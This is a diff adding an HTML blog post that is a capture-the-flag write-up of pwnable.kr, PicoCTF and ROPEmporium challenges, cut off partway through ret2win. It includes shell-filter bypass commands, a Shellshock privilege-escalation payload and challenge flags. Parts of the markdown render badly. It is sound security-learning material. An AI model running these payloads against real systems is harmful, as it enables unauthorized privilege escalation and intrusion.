@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      Week 4 - CTF Madness
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Week 4 - CTF Madness" />
+<meta name="author" content="Jake Mullins" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="As my junior year wraps up, I have a bit of time after finals weeks before my summer job(s) roles start, so I did a list of mostly binary-exploitation related CTFs: 5 challenges off of pwnable.kr, a wargame “powered/supported by” Georgia Tech in Atlanta and KyungHee University in Seoul. 1 challenge from PicoCTF, Carnegie Mellon’s CTF training platform 1+1/2 challenge from ROPEmporium pwnable.kr:CMD1 Here’s the source code for this challenge ```C #include #include" />
+<meta property="og:description" content="As my junior year wraps up, I have a bit of time after finals weeks before my summer job(s) roles start, so I did a list of mostly binary-exploitation related CTFs: 5 challenges off of pwnable.kr, a wargame “powered/supported by” Georgia Tech in Atlanta and KyungHee University in Seoul. 1 challenge from PicoCTF, Carnegie Mellon’s CTF training platform 1+1/2 challenge from ROPEmporium pwnable.kr:CMD1 Here’s the source code for this challenge ```C #include #include" />
+<link rel="canonical" href="http://localhost:4000/year-of-hacking-0x4" />
+<meta property="og:url" content="http://localhost:4000/year-of-hacking-0x4" />
+<meta property="og:site_name" content="Jake Mullins" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-22T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Week 4 - CTF Madness" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jake Mullins"},"dateModified":"2024-04-22T00:00:00-06:00","datePublished":"2024-04-22T00:00:00-06:00","description":"As my junior year wraps up, I have a bit of time after finals weeks before my summer job(s) roles start, so I did a list of mostly binary-exploitation related CTFs: 5 challenges off of pwnable.kr, a wargame “powered/supported by” Georgia Tech in Atlanta and KyungHee University in Seoul. 1 challenge from PicoCTF, Carnegie Mellon’s CTF training platform 1+1/2 challenge from ROPEmporium pwnable.kr:CMD1 Here’s the source code for this challenge ```C #include #include","headline":"Week 4 - CTF Madness","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/year-of-hacking-0x4"},"url":"http://localhost:4000/year-of-hacking-0x4"}</script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Jake Mullins" />
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+  <link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+  <link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+  <link rel="shortcut icon" href="/assets/images/favicon/favicon.ico">
+  <meta name="msapplication-TileColor" content="#00aba9">
+  <meta name="msapplication-config" content="/assets/images/favicon/browserconfig.xml">
+  <meta name="theme-color" content="#ffffff">
+  <!-- Favicon -->
+
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home...</a>
+<h1 class="post-title">Week 4 - CTF Madness</h1>
+<p class="post-date text-bold">
+  
+  
+    <span class="text-upcase">April 2024</span>
+  
+
+
+  
+  
+  (3987 Words, 
+  23 Minutes)
+  
+
+</p>
+
+
+  <div class="">
+    
+    <span class="tag">year-of-hacking</span>
+    
+    <span class="tag">CTF</span>
+    
+    <span class="tag">writeup</span>
+    
+  </div>
+
+
+<p>As my junior year wraps up, I have a bit of time after finals weeks before my summer job(s) roles start, so I did a list of mostly binary-exploitation related CTFs:</p>
+<ul>
+  <li>5 challenges off of <a href="pwnable.kr">pwnable.kr</a>, a wargame “powered/supported by” Georgia Tech in Atlanta and KyungHee University in Seoul.</li>
+  <li>1 challenge from <a href="https://picoctf.org/">PicoCTF</a>, Carnegie Mellon’s CTF training platform</li>
+  <li>1+1/2 challenge from <a href="https://ropemporium.com/">ROPEmporium</a>
+    <h2 id="pwnablekrcmd1">pwnable.kr:CMD1</h2>
+    <p>Here’s the source code for this challenge
+```C
+#include <stdio.h>
+#include <string.h></string.h></stdio.h></p>
+  </li>
+</ul>
+
+<p>int filter (char* cmd) {
+	int r=0;
+	r += strstr(cmd, “flag”)!=0;
+	r += strstr(cmd, “sh”)!=0;
+	r += strstr(cmd, “tmp”)!=0;
+	return r;
+}</p>
+
+<p>int main(int argv, char* argv[], char** envp) {
+	putenv(“PATH=/thankyouverymuch”);
+	if(filter(argv[])) return 0;
+	system( argv[1] );
+	return 0;
+}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>It looks like the binary takes the arguments passed to it, runs it through a filter, and runs them through `sh`.
+
+The `putenv` rolls over the `PATH` environment variable, meaning that it's not able to use relative paths. That means we just need to use an absolute to get a command to run. We also can't specify `flag`, so we just need to print out everything in a directory:
+```bash
+cmd1@pwnable:~$ ./cmd1 "/bin/cat /home/cmd1/*"
+</code></pre></div></div>
+<p>This prints out everything, and we can find the flag after wading through the garbage spat out by the binary:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        r += strstr(cmd, "flag")!=0;                h%r
+        r += strstr(cmd, "sh")!=0;                      h1I^HHPTI@Hp@H@H
+ HtÐUHS=r += strstr(cmd, "tmp")!=0;
+        return r;
+}               H8`HHH9s$fDHH
+int main(int argc, char* argv[], char** envp){
+ H9r    putenv("PATH=/thankyouverymuch");
+ []fff.Hif(filter(argv[1])) return 0;HEHEd@HHEEUHH }HuHUh@kHEHH\tHEHHǸHl$Ld$H- L% Ll$system( argv[1] );t1@LLDAHH9uH\Hl$Ld$Ll$ Lt$(L|$0H8UHS Ht(`DHHu[]ÐflagshtmpPAreturn 0;ouverymuch4PxzRx
+}                               FJ
+j                                 ?;*3$"DoAC
+mommy now I get what PATH environment is for :)
+</code></pre></div></div>
+
+<h2 id="pwnablekrcmd2">pwnable.kr:CMD2</h2>
+<p>This challenge is similar to <code class="language-plaintext highlighter-rouge">cmd1</code>, but with a more comprehensive filter, adding <code class="language-plaintext highlighter-rouge">PATH</code>, <code class="language-plaintext highlighter-rouge">export</code>, `,  <code class="language-plaintext highlighter-rouge">=</code>, and most pertinently <code class="language-plaintext highlighter-rouge">/</code>. It also removes any environment variables:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+  
+int filter(char* cmd){
+    int r=0;
+    r += strstr(cmd, "=")!=0;
+    r += strstr(cmd, "PATH")!=0;
+    r += strstr(cmd, "export")!=0;
+    r += strstr(cmd, "/")!=0;
+    r += strstr(cmd, "`")!=0;
+    r += strstr(cmd, "flag")!=0;
+    return r;
+}
+  
+extern char** environ;
+void delete_env(){
+    char** p;
+    for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
+}
+  
+int main(int argc, char* argv[], char** envp){
+    delete_env();
+    putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+    if(filter(argv[1])) return 0;
+    printf("%s\n", argv[1]);
+    system( argv[1] );
+    return 0;
+}
+</code></pre>
+
+<p>Last time, we solved the challenge by using the absolute path for executing binaries, but that won’t work because the <code class="language-plaintext highlighter-rouge">/</code> character is blocked. Because the filter is only applied once, I bet we can use bash shenanigans to create the <code class="language-plaintext highlighter-rouge">/</code> character. I created a small program to mimic portions of the target environment:</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+  
+int main() {
+    putenv("PATH=/fake_dir");
+    system("/bin/sh");
+}
+</code></pre>
+
+<p>Messing around a bit, I found out that running:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="si">$(</span><span class="nb">echo pwd</span><span class="si">)</span>
+/home/&lt;home_dir&gt;/ctf/pwnable/cmd
+</code></pre></div></div>
+
+<p>Returns the current dir, and we can try to use this to our advantage:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>13:17<span class="o">}</span>~/ctf/pwnable/cmd ➭ ./cmd2 <span class="s2">"</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span><span class="s2">"</span>
+<span class="o">{</span>13:18<span class="o">}</span>~/ctf/pwnable/cmd ➭
+</code></pre></div></div>
+
+<p>Hmm, it looks like <code class="language-plaintext highlighter-rouge">$(pwd)</code> might have evaluated to <code class="language-plaintext highlighter-rouge">/</code> before being passed in, triggering the filter. Luckily I remember an offhand comment made by <a href="https://twitter.com/legoclones">@legoclones</a> that there is a difference between the <code class="language-plaintext highlighter-rouge">'</code> single tick and <code class="language-plaintext highlighter-rouge">"</code> double tick quotes in UNIX shells. I tried using single-ticks:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd2@pwnable:~<span class="nv">$ </span>./cmd2 <span class="s1">'$(pwd)'</span>
+<span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>
+sh: 1: /home/cmd2: Permission denied
+</code></pre></div></div>
+
+<p>Success! Looks like it tried to execute <code class="language-plaintext highlighter-rouge">/home/cmd2</code> as a binary, which of course failed. We can experiment to see if we can make the <code class="language-plaintext highlighter-rouge">cwd</code> <code class="language-plaintext highlighter-rouge">/</code> so we can use it for later:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd2@pwnable:~<span class="nv">$ </span>./cmd2 <span class="s1">'cd ..; cd ..; $(echo pwd)'</span>
+<span class="nb">cd</span> ..<span class="p">;</span> <span class="nb">cd</span> ..<span class="p">;</span> <span class="si">$(</span><span class="nb">echo pwd</span><span class="si">)</span>
+/
+cmd2@pwnable:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>We can then uses this <code class="language-plaintext highlighter-rouge">$(pwd)</code> to execute the same attack:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd2@pwnable:~<span class="nv">$ </span>./cmd2 <span class="s1">'cd ..; cd ..; $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*'</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+<span class="nb">.</span>
+        char<span class="k">**</span> p<span class="p">;</span>
+        <span class="k">for</span><span class="o">(</span><span class="nv">p</span><span class="o">=</span>environ<span class="p">;</span> <span class="k">*</span>p<span class="p">;</span> p++<span class="o">)</span> memset<span class="o">(</span><span class="k">*</span>p, 0, strlen<span class="o">(</span><span class="k">*</span>p<span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+int main<span class="o">(</span>int argc, char<span class="k">*</span> argv[], char<span class="k">**</span> envp<span class="o">){</span>                                                                                                                     delete_env<span class="o">()</span><span class="p">;</span>
+        putenv<span class="o">(</span><span class="s2">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="o">)</span><span class="p">;</span>
+        <span class="k">if</span><span class="o">(</span>filter<span class="o">(</span>argv[1]<span class="o">))</span> <span class="k">return </span>0<span class="p">;</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, argv[1]<span class="o">)</span><span class="p">;</span>
+        system<span class="o">(</span> argv[1] <span class="o">)</span><span class="p">;</span>
+        <span class="k">return </span>0<span class="p">;</span>
+<span class="o">}</span>
+FuN_w1th_5h3ll_v4riabl3s_haha               
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">system</code> call executed:</p>
+<ol>
+  <li>Change dir to <code class="language-plaintext highlighter-rouge">..</code>, the parent dir</li>
+  <li>Change dir to <code class="language-plaintext highlighter-rouge">..</code>, the parent dir</li>
+  <li>Resolved all of the <code class="language-plaintext highlighter-rouge">$(pwd)</code> in <code class="language-plaintext highlighter-rouge">$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)*</code> to <code class="language-plaintext highlighter-rouge">/</code>, to result in <code class="language-plaintext highlighter-rouge">/bin/cat /home/cmd2/*</code>
+    <h2 id="pwnablekrlotto">pwnable.kr:lotto</h2>
+    <p>As usual, we get CLI access to a machine with 3 files, <code class="language-plaintext highlighter-rouge">lotto</code>, <code class="language-plaintext highlighter-rouge">lotto.c</code>, and <code class="language-plaintext highlighter-rouge">flag</code>. I pulled down <code class="language-plaintext highlighter-rouge">lotto</code> and <code class="language-plaintext highlighter-rouge">lotto.c</code>, and inspected the source code:
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h></fcntl.h></string.h></stdlib.h></stdio.h></p>
+  </li>
+</ol>
+
+<p>unsigned char submit[6];</p>
+
+<p>void play(){
+    int i;
+    printf(“Submit your 6 lotto bytes : “);
+    fflush(stdout);</p>
+
+<p>    int r;
+    r = read(0, submit, 6);</p>
+
+<p>    printf(“Lotto Start!\n”);
+    //sleep(1);</p>
+
+<p>    // generate lotto numbers
+    int fd = open(“/dev/urandom”, O_RDONLY);
+    if(fd==-1){
+        printf(“error. tell admin\n”);
+        exit(-1);
+    }
+    unsigned char lotto[6];
+    if(read(fd, lotto, 6) != 6){
+        printf(“error2. tell admin\n”);
+        exit(-1);
+    }
+    for(i=0; i&lt;6; i++){
+        lotto[i] = (lotto[i] % 45) + 1;     // 1 ~ 45
+    }
+    close(fd);
+    // calculate lotto score
+    int match = 0, j = 0;
+    for(i=0; i&lt;6; i++){
+        for(j=0; j&lt;6; j++){
+            if(lotto[i] == submit[j]){
+                match++;
+            }
+        }
+    }</p>
+
+<p>    // win!
+    if(match == 6){
+        system(“/bin/cat flag”);
+    }
+    else{
+        printf(“bad luck…\n”);
+    }</p>
+
+<p>}</p>
+
+<p>void help(){
+    printf(“- nLotto Rule -\n”);
+    prntf(“nlotto is consisted with 6 random natural numbers less than 46\n”);
+    printf(“your goal is to match lotto numbers as many as you can\n”);
+    printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);
+    printf(“for more details, follow the link below\n”);
+    printf(“http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n”);
+    printf(“mahematical chance to win this game is known to be 1/8145060.\n”);
+}</p>
+
+<p>int main(int argc, char* argv[]){</p>
+
+<p>    // menu
+    unsigned int menu;</p>
+
+<p>    while(1){</p>
+
+<p>        printf(“- Select Menu -\n”);
+        printf(“1. Play Lotto\n”);
+        printf(“2. Help\n”);
+        printf(“3. Exit\n”);</p>
+
+<p>        scanf(“%d”, &amp;menu);</p>
+
+<p>        switch(menu){
+            case 1:
+                play();
+                break;
+            case 2:
+                help();
+                break;
+            case 3:
+                printf(“bye\n”);
+                return 0;
+            default:
+                printf(“invalid menu\n”);
+                break;
+        }
+    }
+    return 0;
+}</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+It looks like the program takes 6 bytes, normalizes them to mod space 46, then checks if it matches 6 random bytes.
+
+It doesn't look like a textbook buffer overflow is possible, so perhaps there is a programming error. Taking a look at the scoring:
+```C    
+// calculate lotto score
+int match = 0, j = 0;
+for(i=0; i&lt;6; i++){
+	for(j=0; j&lt;6; j++){
+		if(lotto[i] == submit[j]){
+			match++;
+		}
+	}
+}
+// win!
+if(match == 6){
+	system("/bin/cat flag");
+}
+</code></pre></div></div>
+
+<p>It looks like there is a nested for-loop that increments a <code class="language-plaintext highlighter-rouge">match</code> integer for every time a number in the input appears in the actual lotto. However, because of the nested for loop, if a string is passed with all identical characters, and that character is in the lotto bytes, it will increment the variable 6 times! Surprisingly, it worked the first time:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lotto@pwnable:~<span class="nv">$ </span>./lotto
+- Select Menu -
+1. Play Lotto
+2. Help
+3. Exit
+1
+Submit your 6 lotto bytes : %%%%%%%
+Lotto Start!
+sorry mom... I FORGOT to check duplicate numbers... :<span class="o">(</span>
+- Select Menu -
+1. Play Lotto
+2. Help
+3. Exit
+Submit your 6 lotto bytes :   
+</code></pre></div></div>
+<p>I’m no stats expert but my gut says that there is a 6/46, or ~13% chance this works per execution.</p>
+
+<h2 id="pwnablekrmistake">pwnable.kr:mistake</h2>
+<p>We are given a C binary, which is surprising because it is incredibly easy to program C without any mistakes.</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+ 
+#define PW_LEN 10
+#define XORKEY 1
+  
+void xor(char* s, int len){
+    int i;
+    for(i=0; i&lt;len; i++){
+        s[i] ^= XORKEY;
+    }
+}
+  
+int main(int argc, char* argv[]){
+    int fd;
+    if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0){
+        printf("can't open password %d\n", fd);
+        return 0;
+    }
+  
+    printf("do not bruteforce...\n");
+    sleep(time(0)%20);
+  
+    char pw_buf[PW_LEN+1];
+    int len;
+    if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){
+        printf("read error\n");
+        close(fd);
+        return 0;      
+    }
+  
+    char pw_buf2[PW_LEN+1];
+    printf("input password : ");
+    scanf("%10s", pw_buf2);
+  
+    // xor your input
+    xor(pw_buf2, 10);
+  
+    if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
+        printf("Password OK\n");
+        system("/bin/cat flag\n");
+    }
+    else{
+        printf("Wrong Password\n");
+    }
+  
+    close(fd);
+    return 0;
+}
+</code></pre>
+
+<p>The hint talks about operator precedence, so investigating this line:</p>
+<pre><code class="language-C">int fd;
+if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)
+</code></pre>
+<p>I know that the assignment operator <code class="language-plaintext highlighter-rouge">=</code> has just about the lowest precedence with left-right associativity, meaning that everything to the right of the operator will be evaluated before it is assigned to the <code class="language-plaintext highlighter-rouge">lvalue</code>. That means that <code class="language-plaintext highlighter-rouge">open</code> will be return with no error, assigning <code class="language-plaintext highlighter-rouge">fd</code> to <code class="language-plaintext highlighter-rouge">0</code>. Luckily this <code class="language-plaintext highlighter-rouge">fd</code> is used as the file descriptor for <code class="language-plaintext highlighter-rouge">read</code>, which means it will instead take input from <code class="language-plaintext highlighter-rouge">STDIN</code>:</p>
+<pre><code class="language-C">char pw_buf[PW_LEN+1];
+int len;
+if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){
+</code></pre>
+
+<p>Knowing this, we can control before the <code class="language-plaintext highlighter-rouge">pw_buf</code> and <code class="language-plaintext highlighter-rouge">pw_buf2</code> buffers. Adding some <code class="language-plaintext highlighter-rouge">printf</code> statements, we can experiment with what the result of <code class="language-plaintext highlighter-rouge">pw_buf2</code> would be after the <code class="language-plaintext highlighter-rouge">xor</code> function:</p>
+<pre><code class="language-C">printf("PW1: %s\n", pw_buf);
+printf("PW2: %s\n", pw_buf2);
+
+// xor your input
+xor(pw_buf2, 10);
+printf("After PW2: %s\n", pw_buf2);
+</code></pre>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asdfasdfas
+input password: asdfasdfas
+PW1: asdfasdfas
+PW2: asdfasdfas
+After PW2: `reg`reg`r
+Wrong Password
+</code></pre></div></div>
+
+<p>Feeding the original program the input:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mistake@pwnable:~$ ./mistake
+do not bruteforce...
+asdfasdfas
+input password : `reg`reg`re
+Password OK
+Mommy, the operator priority always confuses me :(
+</code></pre></div></div>
+
+<h2 id="pwnablekrshellshock">pwnable.kr:shellshock</h2>
+<p>We are given a C binary that looks like it is vulnerable to a privilege escalation attack, as the <code class="language-plaintext highlighter-rouge">setuid</code> bit is set.</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+int main(){
+        setresuid(getegid(), getegid(), getegid());
+        setresgid(getegid(), getegid(), getegid());
+        system("/home/shellshock/bash -c 'echo shock_me'");
+        return 0;
+}
+</code></pre>
+<p>However, the hint says <code class="language-plaintext highlighter-rouge">Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :)</code>. Looking up <code class="language-plaintext highlighter-rouge">shellshock bash</code> brings up a vulnerability called <code class="language-plaintext highlighter-rouge">shellshock</code> affects bash version through 4.3. Running <code class="language-plaintext highlighter-rouge">bash -- version</code>, we see that the version on the server is the vulnerable 4.3.48. Scrolling through exploit-db’s list of references, I found <a href="https://www.redhat.com/en/blog/bash-specially-crafted-environment-variables-code-injection-attack">this</a> redhat article. Using the example, I constructed a payload to open a shell using the uid and gid of the shellshock binary owner:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellshock@pwnable:~<span class="nv">$ </span><span class="nb">env </span><span class="nv">x</span><span class="o">=</span><span class="s1">'() { :;}; /bin/bash'</span> bash <span class="nt">-c</span> <span class="s2">"./shellshock"</span>
+</code></pre></div></div>
+<p>This opens a new shell, allowing me to cat out the flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellshock@pwnable:~$ cat flag
+only if I knew CVE-2014-6271 ten years ago..!!
+</code></pre></div></div>
+
+<h2 id="picoctfbookmarklet">PicoCTF:Bookmarklet</h2>
+<p>We get a link to a website that has a textbox with the following javascript:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">javascript</span><span class="p">:(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">encryptedFlag</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓ¡ÒÅ¤í</span><span class="dl">"</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">picoctf</span><span class="dl">"</span><span class="p">;</span>
+	<span class="kd">var</span> <span class="nx">decryptedFlag</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">encryptedFlag</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">decryptedFlag</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">((</span><span class="nx">encryptedFlag</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="o">-</span> <span class="nx">key</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">i</span> <span class="o">%</span> <span class="nx">key</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="nx">alert</span><span class="p">(</span><span class="nx">decryptedFlag</span><span class="p">);</span>
+<span class="p">})();</span>
+</code></pre></div></div>
+<p>Turns out, you can run javascript code in bookmarks! We won’t bother with that by just copying it into a browser console. It creates an alert that contains the flag: <code class="language-plaintext highlighter-rouge">picoCTF{p@g3_turn3r_0148cb05}</code>.</p>
+
+<h2 id="ropemporiumret2win">ROPEmporium:ret2win</h2>
+<p>We are given a simple binary. Loading it into GDB, we can get an idea of the binary using <code class="language-plaintext highlighter-rouge">info functions</code>:</p>
+<pre><code class="language-GDB">gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000400528  _init
+0x0000000000400550  puts@plt
+0x0000000000400560  system@plt
+0x0000000000400570  printf@plt
+0x0000000000400580  memset@plt
+0x0000000000400590  read@plt
+0x00000000004005a0  setvbuf@plt
+0x00000000004005b0  _start
+0x00000000004005e0  _dl_relocate_static_pie
+0x00000000004005f0  deregister_tm_clones
+0x0000000000400620  register_tm_clones
+0x0000000000400660  __do_global_dtors_aux
+0x0000000000400690  frame_dummy
+0x0000000000400697  main
+0x00000000004006e8  pwnme
+0x0000000000400756  ret2win
+0x0000000000400780  __libc_csu_init
+0x00000000004007f0  __libc_csu_fini
+0x00000000004007f4  _fini
+gef➤
+</code></pre>
+
+<p>Of note is the <code class="language-plaintext highlighter-rouge">main</code>, <code class="language-plaintext highlighter-rouge">pwnme</code>, and <code class="language-plaintext highlighter-rouge">ret2win</code> functions. We can call these 3 functions to get an idea of what’s happening:</p>
+<pre><code class="language-GDB">gef➤  disas main
+Dump of assembler code for function main:
+   0x0000000000400697 &lt;+0&gt;:     push   rbp
+   0x0000000000400698 &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040069b &lt;+4&gt;:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 &lt;stdout@@GLIBC_2.2.5&gt;
+   0x00000000004006a2 &lt;+11&gt;:    mov    ecx,0x0
+   0x00000000004006a7 &lt;+16&gt;:    mov    edx,0x2
+   0x00000000004006ac &lt;+21&gt;:    mov    esi,0x0
+   0x00000000004006b1 &lt;+26&gt;:    mov    rdi,rax
+   0x00000000004006b4 &lt;+29&gt;:    call   0x4005a0 &lt;setvbuf@plt&gt;
+   0x00000000004006b9 &lt;+34&gt;:    mov    edi,0x400808
+   0x00000000004006be &lt;+39&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x00000000004006c3 &lt;+44&gt;:    mov    edi,0x400820
+   0x00000000004006c8 &lt;+49&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x00000000004006cd &lt;+54&gt;:    mov    eax,0x0
+   0x00000000004006d2 &lt;+59&gt;:    call   0x4006e8 &lt;pwnme&gt;
+   0x00000000004006d7 &lt;+64&gt;:    mov    edi,0x400828
+   0x00000000004006dc &lt;+69&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x00000000004006e1 &lt;+74&gt;:    mov    eax,0x0
+   0x00000000004006e6 &lt;+79&gt;:    pop    rbp
+   0x00000000004006e7 &lt;+80&gt;:    ret
+End of assembler dump.
+gef➤         
+</code></pre>
+
+<p>It looks like <code class="language-plaintext highlighter-rouge">main</code> calls <code class="language-plaintext highlighter-rouge">pwnme</code>, but never <code class="language-plaintext highlighter-rouge">ret2win</code>.</p>
+<pre><code class="language-GDB">gef➤  disas pwnme
+Dump of assembler code for function pwnme:
+   0x00000000004006e8 &lt;+0&gt;:     push   rbp
+   0x00000000004006e9 &lt;+1&gt;:     mov    rbp,rsp
+   0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x20
+   0x00000000004006f0 &lt;+8&gt;:     lea    rax,[rbp-0x20]
+   0x00000000004006f4 &lt;+12&gt;:    mov    edx,0x20
+   0x00000000004006f9 &lt;+17&gt;:    mov    esi,0x0
+   0x00000000004006fe &lt;+22&gt;:    mov    rdi,rax
+   0x0000000000400701 &lt;+25&gt;:    call   0x400580 &lt;memset@plt&gt;
+   0x0000000000400706 &lt;+30&gt;:    mov    edi,0x400838
+   0x000000000040070b &lt;+35&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400710 &lt;+40&gt;:    mov    edi,0x400898
+   0x0000000000400715 &lt;+45&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x000000000040071a &lt;+50&gt;:    mov    edi,0x4008b8
+   0x000000000040071f &lt;+55&gt;:    call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400724 &lt;+60&gt;:    mov    edi,0x400918
+   0x0000000000400729 &lt;+65&gt;:    mov    eax,0x0
+   0x000000000040072e &lt;+70&gt;:    call   0x400570 &lt;printf@plt&gt;
+   0x0000000000400733 &lt;+75&gt;:    lea    rax,[rbp-0x20]
+   0x0000000000400737 &lt;+79&gt;:    mov    edx,0x38
+   0x000000000040073c &lt;+84&gt;:    mov    rsi,rax
+   0x000000000040073f &lt;+87&gt;:    mov    edi,0x0
+   0x0000000000400744 &lt;+92&gt;:    call   0x400590 &lt;read@plt&gt;
+   0x0000000000400749 &lt;+97&gt;:    mov    edi,0x40091b
+   0x000000000040074e &lt;+102&gt;:   call   0x400550 &lt;puts@plt&gt;
+   0x0000000000400753 &lt;+107&gt;:   nop
+   0x0000000000400754 &lt;+108&gt;:   leave
+   0x0000000000400755 &lt;+109&gt;:   ret
+End of assembler dump.
+gef➤    
+</code></pre>
+<p>I would bet there’s a buffer overflow vulnerability at the <code class="language-plaintext highlighter-rouge">read</code> call at <code class="language-plaintext highlighter-rouge">pwnme+97</code>. Loading this binary into Ghidra, my suspicions are confirmed:</p>
+<pre><code class="language-C">void pwnme(void)
+{
+	unsigned char buf [32];
+  
